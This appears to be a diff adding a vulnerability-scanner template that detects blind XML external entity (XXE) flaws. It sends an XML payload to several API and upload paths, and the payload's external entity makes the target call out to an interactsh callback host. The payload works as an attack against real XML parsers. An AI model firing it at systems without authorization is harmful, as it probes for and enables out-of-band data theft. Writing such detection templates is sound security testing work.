@@ -1,0 +1,31 @@
+id: m7-xxe-blind-oob
+info:
+  name: M7 - Blind XXE via OOB Callback
+  author: Sharlix
+  severity: high
+  description: Blind XXE detection using out-of-band DNS callback
+  tags: xxe,blind,oob,m7hunter
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api"
+      - "{{BaseURL}}/api/xml"
+      - "{{BaseURL}}/upload"
+      - "{{BaseURL}}/parse"
+
+    body: |
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{{interactsh-url}}/xxe"> %xxe;]>
+      <root><data>test</data></root>
+
+    headers:
+      Content-Type: application/xml
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
+        condition: or
